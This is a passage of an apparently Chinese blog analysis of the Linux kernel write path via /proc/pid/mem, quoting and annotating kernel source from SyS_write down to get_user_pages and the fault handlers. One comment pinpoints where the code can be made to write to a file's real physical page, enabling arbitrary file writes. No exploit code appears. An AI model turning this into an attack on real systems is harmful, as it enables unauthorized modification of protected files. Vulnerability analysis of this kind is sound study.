class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c">entry_SYSCALL_64(arch/x86/entry/entry_64.S:<span class="hljs-number">185</span>)<br>-&gt;<br>SyS_write(fs/read_write.c:<span class="hljs-number">577</span>) <br>-&gt; <br>SYSC_write(fs/read_write.c:<span class="hljs-number">585</span>) <br>-&gt; <br>vfs_write(fs/read_write.c:<span class="hljs-number">538</span>)<br>-&gt;<br>__vfs_write(fs/read_write.c:<span class="hljs-number">489</span>)<br>-&gt;<br>mem_write(fs/proc/base.c:<span class="hljs-number">908</span>)<br>-&gt;<br>mem_rw(fs/proc/base.c:<span class="hljs-number">908</span>)<br>-&gt;<br>access_remote_vm(mm/memory.c:<span class="hljs-number">3722</span>)<br>-&gt;<br>__access_remote_vm(mm/memory.c:<span class="hljs-number">3662</span>)<br>-&gt;<br>get_user_pages(mm/gup.c:<span class="hljs-number">859</span>)<br>-&gt;<br>__get_user_pages_locked(mm/gup.c:<span class="hljs-number">651</span>)<br>-&gt;<br>__get_user_pages(mm/gup.c:<span class="hljs-number">457</span>)<br>-&gt;<br>follow_page_mask(mm/gup.c+<span class="hljs-number">180</span>) and <span class="hljs-title function_">faultin_page</span><span class="hljs-params">(mm/gup.c+<span class="hljs-number">303</span>)</span><br>-&gt;<br><span class="hljs-title function_">handle_mm_fault</span><span class="hljs-params">(mm/memory.c+<span class="hljs-number">3424</span>)</span><br>-&gt;<br>__<span class="hljs-title function_">handle_mm_fault</span><span class="hljs-params">(mm/memory.c+<span class="hljs-number">3339</span>)</span><br>-&gt;<br><span class="hljs-title function_">handle_pte_fault</span><span class="hljs-params">(mm/memory.c+<span class="hljs-number">3287</span>)</span><br></code></pre></td></tr></table></figure><h2 id="SyS-write"><a href="#SyS-write" class="headerlink" title="SyS_write"></a><strong>SyS_write</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(write, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *, buf,<br><span class="hljs-type">size_t</span>, count)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd</span> <span class="hljs-title">f</span> =</span> fdget_pos(fd); <span class="hljs-comment">//根据文件描述符获取对应的文件</span><br><span class="hljs-type">ssize_t</span> ret = -EBADF; <span class="hljs-comment">//#defineEBADF 9/* Bad file number */</span><br><br><span class="hljs-keyword">if</span> (f.file) &#123;<br><span class="hljs-type">loff_t</span> pos = file_pos_read(f.file); <span class="hljs-comment">//loff_t为long long类型,读取文件位置</span><br>ret = vfs_write(f.file, buf, count, &amp;pos);<span class="hljs-comment">//以pos位置为起点写入文件，写入内容为buf，写入字节数为count</span><br><span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>)<br>file_pos_write(f.file, pos);<br>fdput_pos(f);<br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="vfs-write"><a href="#vfs-write" class="headerlink" title="vfs_write"></a><strong>vfs_write</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vfs_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf, <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br><span class="hljs-type">ssize_t</span> ret;<br><br><span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_WRITE)) <span class="hljs-comment">//判断是否可写</span><br><span class="hljs-keyword">return</span> -EBADF;<br><span class="hljs-keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_CAN_WRITE))<span class="hljs-comment">//判断是否有写函数</span><br><span class="hljs-keyword">return</span> -EINVAL; <span class="hljs-comment">//#defineEINVAL22/* Invalid argument */</span><br><span class="hljs-keyword">if</span> (unlikely(!access_ok(VERIFY_READ, buf, count))) <span class="hljs-comment">//判断写入的字符是否超过了用户态的缓冲区空间，即大于0x7ffffffff000</span><br><span class="hljs-keyword">return</span> -EFAULT; <span class="hljs-comment">//#defineEFAULT14/* Bad address */</span><br><br>ret = rw_verify_area(WRITE, file, pos, count); <span class="hljs-comment">//判断所在区域是否可写</span><br><span class="hljs-keyword">if</span> (ret &gt;= <span class="hljs-number">0</span>) &#123;<br>count = ret;<br>file_start_write(file);<br>ret = __vfs_write(file, buf, count, pos);<br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>fsnotify_modify(file);<br>add_wchar(current, ret);<br>&#125;<br>inc_syscw(current);<br>file_end_write(file);<br>&#125;<br><br><span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="vfs-write-1"><a href="#vfs-write-1" class="headerlink" title="__vfs_write"></a><strong>__vfs_write</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __vfs_write(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *p, <span class="hljs-type">size_t</span> count,<br>    <span class="hljs-type">loff_t</span> *pos)<br>&#123;<br><span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write)<br><span class="hljs-keyword">return</span> file-&gt;f_op-&gt;write(file, p, count, pos); <span class="hljs-comment">//根据写入文件类型选择相应的写入函数，这里是mem_write</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (file-&gt;f_op-&gt;write_iter)<br><span class="hljs-keyword">return</span> new_sync_write(file, p, count, pos);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="mem-write"><a href="#mem-write" class="headerlink" title="mem_write"></a>mem_write</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> __user *buf,</span><br><span class="hljs-params"> <span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos)</span><br>&#123;<br><span class="hljs-keyword">return</span> mem_rw(file, (<span class="hljs-type">char</span> __user*)buf, count, ppos, <span class="hljs-number">1</span>); <span class="hljs-comment">//mem_write实际上是对mem_rw函数的封装</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="mem-rw"><a href="#mem-rw" class="headerlink" title="mem_rw"></a>mem_rw</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">ssize_t</span> <span class="hljs-title function_">mem_rw</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">char</span> __user *buf,</span><br><span class="hljs-params"><span class="hljs-type">size_t</span> count, <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">int</span> write)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> file-&gt;private_data;<span class="hljs-comment">//私有数据</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = *ppos;<span class="hljs-comment">//写入地址</span><br><span class="hljs-type">ssize_t</span> copied;<br><span class="hljs-type">char</span> *page;<br><br><span class="hljs-keyword">if</span> (!mm)<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>page = (<span class="hljs-type">char</span> *)__get_free_page(GFP_TEMPORARY); <span class="hljs-comment">//获取空闲页</span><br><span class="hljs-keyword">if</span> (!page)<br><span class="hljs-keyword">return</span> -ENOMEM;<br><br>copied = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span> (!atomic_inc_not_zero(&amp;mm-&gt;mm_users))<br><span class="hljs-keyword">goto</span> <span class="hljs-built_in">free</span>;<br><br><span class="hljs-keyword">while</span> (count &gt; <span class="hljs-number">0</span>) &#123;<br><span class="hljs-type">int</span> this_len = <span class="hljs-type">min_t</span>(<span class="hljs-type">int</span>, count, PAGE_SIZE); <span class="hljs-comment">//取两者之间更小的值</span><br><br><span class="hljs-keyword">if</span> (write &amp;&amp; copy_from_user(page, buf, this_len)) &#123; <span class="hljs-comment">//将用户态缓存区数据先拷贝的页</span><br>copied = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>this_len = access_remote_vm(mm, addr, page, this_len, write); <span class="hljs-comment">//跨进程写操作</span><br><span class="hljs-keyword">if</span> (!this_len) &#123;<br><span class="hljs-keyword">if</span> (!copied)<br>copied = -EIO;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (!write &amp;&amp; copy_to_user(buf, page, this_len)) &#123;<br>copied = -EFAULT;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>buf += this_len;<br>addr += this_len;<br>copied += this_len;<br>count -= this_len;<br>&#125;<br>*ppos = addr;<br><br>mmput(mm);<br><span class="hljs-built_in">free</span>:<br>free_page((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page);<br><span class="hljs-keyword">return</span> copied;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="access-remote-vm"><a href="#access-remote-vm" class="headerlink" title="access_remote_vm"></a><strong>access_remote_vm</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">access_remote_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> mm_struct *mm, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr,</span><br><span class="hljs-params"><span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">mm = mm</span><br><span class="hljs-comment">addr = addr</span><br><span class="hljs-comment">buf = page</span><br><span class="hljs-comment">len = this_len</span><br><span class="hljs-comment">write = write</span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//access_remote_vm(mm, addr, page, this_len, write);</span><br><span class="hljs-keyword">return</span> __access_remote_vm(<span class="hljs-literal">NULL</span>, mm, addr, buf, len, write); <span class="hljs-comment">//access_remote_vm内部封装了__access_remote_vm函数</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="access-remote-vm-1"><a href="#access-remote-vm-1" class="headerlink" title="__access_remote_vm"></a>__access_remote_vm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __access_remote_vm(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">int</span> len, <span class="hljs-type">int</span> write)<span class="hljs-comment">//NULL，mm为file-&gt;private_data,addr为写入的地址,buf为page,len为长度,write为写标志位</span><br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">tsk = NULL</span><br><span class="hljs-comment">mm = file-&gt;private_data</span><br><span class="hljs-comment">addr = addr</span><br><span class="hljs-comment">buf = page</span><br><span class="hljs-comment">len = this_len</span><br><span class="hljs-comment">write = write</span><br><span class="hljs-comment">*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vm_area_struct</span> *<span class="hljs-title">vma</span>;</span> <span class="hljs-comment">//虚拟内存的结构体</span><br><span class="hljs-type">void</span> *old_buf = buf; <span class="hljs-comment">//old_buf = page</span><br><br>down_read(&amp;mm-&gt;mmap_sem);<br><span class="hljs-comment">/* ignore errors, just check how much was successfully transferred */</span><br><span class="hljs-keyword">while</span> (len) &#123;<br><span class="hljs-type">int</span> bytes, ret, offset;<br><span class="hljs-type">void</span> *maddr;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">tsk = NULL</span><br><span class="hljs-comment">mm = file-&gt;private_data</span><br><span class="hljs-comment">addr = addr</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">write = write</span><br><span class="hljs-comment">1</span><br><span class="hljs-comment">page = NULL</span><br><span class="hljs-comment">vma = NULL</span><br><span class="hljs-comment">*/</span><br>ret = get_user_pages(tsk, mm, addr, <span class="hljs-number">1</span>,<br>write, <span class="hljs-number">1</span>, &amp;page, &amp;vma); <span class="hljs-comment">//获取需要写入的物理页，漏洞点存在于此，如果我们获取了文件实际的物理页，那么就可以完成任意文件写的操作</span><br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_HAVE_IOREMAP_PROT</span><br><span class="hljs-keyword">break</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check if this is a VM_IO | VM_PFNMAP VMA, which</span><br><span class="hljs-comment"> * we can access using slightly different code.</span><br><span class="hljs-comment"> */</span><br>vma = find_vma(mm, addr);<br><span class="hljs-keyword">if</span> (!vma || vma-&gt;vm_start &gt; addr)<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">if</span> (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;access)<br>ret = vma-&gt;vm_ops-&gt;access(vma, addr, buf,<br>  len, write);<br><span class="hljs-keyword">if</span> (ret &lt;= <span class="hljs-number">0</span>)<br><span class="hljs-keyword">break</span>;<br>bytes = ret;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>bytes = len;<br>offset = addr &amp; (PAGE_SIZE<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (bytes &gt; PAGE_SIZE-offset)<br>bytes = PAGE_SIZE-offset;<br><br>maddr = kmap(page); <span class="hljs-comment">//将高端页帧长期映射(作为持久映射)到内核地址空间中</span><br><span class="hljs-keyword">if</span> (write) &#123; <span class="hljs-comment">//若需要写入</span><br>copy_to_user_page(vma, page, addr,<br>  maddr + offset, buf, bytes);<span class="hljs-comment">//即将上一个进程的page内的内容写入刚刚获取的物理里</span><br>set_page_dirty_lock(page);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>copy_from_user_page(vma, page, addr,<br>    buf, maddr + offset, bytes);<br>&#125;<br>kunmap(page); <span class="hljs-comment">//释放物理页</span><br>page_cache_release(page);<br>&#125;<br>len -= bytes;<br>buf += bytes;<br>addr += bytes;<br>&#125;<br>up_read(&amp;mm-&gt;mmap_sem);<br><br><span class="hljs-keyword">return</span> buf - old_buf;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="get_user_pages"></a>get_user_pages</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">get_user_pages</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *tsk, <span class="hljs-keyword">struct</span> mm_struct *mm,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages, <span class="hljs-type">int</span> write,</span><br><span class="hljs-params"><span class="hljs-type">int</span> force, <span class="hljs-keyword">struct</span> page **pages, <span class="hljs-keyword">struct</span> vm_area_struct **vmas)</span><br>&#123;<br><span class="hljs-keyword">return</span> __get_user_pages_locked(tsk, mm, start, nr_pages, write, force,<br>       pages, vmas, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">false</span>, FOLL_TOUCH);<span class="hljs-comment">//get_user_pages内部封装了__get_user_pages_locked</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="get-user-pages-locked"><a href="#get-user-pages-locked" class="headerlink" title="__get_user_pages_locked"></a>__get_user_pages_locked</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">long</span> __get_user_pages_locked(<span class="hljs-keyword">struct</span> task_struct *tsk,<br><span class="hljs-keyword">struct</span> mm_struct *mm,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> start,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nr_pages,<br><span class="hljs-type">int</span> write, <span class="hljs-type">int</span> force,<br><span class="hljs-keyword">struct</span> page **pages,<br><span class="hljs-keyword">struct</span> vm_area_struct **vmas,<br><span class="hljs-type">int</span> *locked, <span class="hljs-type">bool</span> notify_drop,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)<br>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">__get_user_pages_locked(tsk, mm, start, nr_pages, write, force,</span><br><span class="hljs-comment">       pages, vmas, NULL, false, FOLL_TOUCH);</span><br><span class="hljs-comment">tsk = NULL</span><br><span class="hljs-comment">mm = file-&gt;private_data</span><br><span class="hljs-comment">start = addr</span><br><span class="hljs-comment">nr_pages = 1</span><br><span class="hljs-comment">write = write</span><br><span class="hljs-comment">force = 1 </span><br><span class="hljs-comment">page = NULL</span><br><span class="hljs-comment">vmas = NULL</span><br><span class="hljs-comment">locked = NULL</span><br><span class="hljs-comment">notify_drop = false</span><br><span class="hljs-comment">flags = FOLL_TOUCH</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">long</span> ret, pages_done;<br><span class="hljs-type">bool</span> lock_dropped;<br><br><span class="hljs-keyword">if</span> (locked) &#123;<br><span class="hljs-comment">/* if VM_FAULT_RETRY can be returned, vmas become invalid */</span><br>BUG_ON(vmas);<br><span class="hljs-comment">/* check caller initialized locked */</span><br>BUG_ON(*locked != <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (pages) <br>flags |= FOLL_GET; <span class="hljs-comment">//需要获取页</span><br><span class="hljs-keyword">if</span> (write)<br>flags |= FOLL_WRITE; <span class="hljs-comment">//PTE可写</span><br><span class="hljs-keyword">if</span> (force)<br>flags |= FOLL_FORCE; <span class="hljs-comment">//具有可读/写权限</span><br><br>pages_done = <span class="hljs-number">0</span>;<br>lock_dropped = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">for</span> (;;) &#123;<br>ret = __get_user_pages(tsk, mm, start, nr_pages, flags, pages,<br>       vmas, locked);<br><span class="hljs-keyword">if</span> (!locked)<br><span class="hljs-comment">/* VM_FAULT_RETRY couldn&#x27;t trigger, bypass */</span><br><span class="hljs-keyword">return</span> ret; <span class="hljs-comment">//直接返回</span><br><br><span class="hljs-comment">/* VM_FAULT_RETRY cannot return errors */</span><br><span class="hljs-keyword">if</span> (!*locked) &#123;<br>BUG_ON(ret &lt; <span class="hljs-number">0</span>);<br>BUG_ON(ret &gt;= nr_pages);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!pages)<br><span class="hljs-comment">/* If it&#x27;s a prefault don&#x27;t insist harder */</span><br><span class="hljs-keyword">return</span> ret;<br><br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>) &#123;<br>nr_pages -= ret;<br>pages_done += ret;<br><span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (*locked) &#123;<br><span class="hljs-comment">/* VM_FAULT_RETRY didn&#x27;t trigger */</span><br><span class="hljs-keyword">if</span> (!pages_done)<br>pages_done = ret;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><span class="hljs-comment">/* VM_FAULT_RETRY triggered, so seek to the faulting offset */</span><br>pages += ret;<br>start += ret &lt;&lt; PAGE_SHIFT;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Repeat on the address that fired VM_FAULT_RETRY</span><br><span class="hljs-comment"> * without FAULT_FLAG_ALLOW_RETRY but with</span><br><span class="hljs-comment"> * FAULT_FLAG_TRIED.</span><br><span class="hljs-comment"> */</span><br>*locked = <span class="hljs-number">1</span>;<br>lock_dropped = <span class="hljs-literal">true</span>;<br>down_read(&amp;mm-&gt;mmap_sem);<br>ret = __get_user_pages(tsk, mm, start, <span class="hljs-number">1</span>, flags | FOLL_TRIED,<br>       pages, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (ret != <span class="hljs-number">1</span>) &#123;<br>BUG_ON(ret &gt; <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!pages_done)<br>pages_done = ret;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>nr_pages--;<br>pages_done++;<br><span class="hljs-keyword">if</span> (!nr_pages)<br><span class="hljs-keyword">break</span>;<br>pages++;<br>start += PAGE_SIZE;<br>&#125;<br><span class="hljs-keyword">if</span> (notify_drop &amp;&amp; lock_dropped &amp;&amp; *locked) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * We must let the caller know we temporarily dropped the lock</span><br><span class="hljs-comment"> * and so the critical section protected by it was lost.</span><br><span class="hljs-comment"> */</span><br>up_read(&amp;mm-&gt;mmap_sem);<br>*locked = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> pages_done;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="get-user-pages-1"><a href="#get-user-pages-1" class="headerlink" title="__get_user_pages"></a><strong>__get_user_pages</strong></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 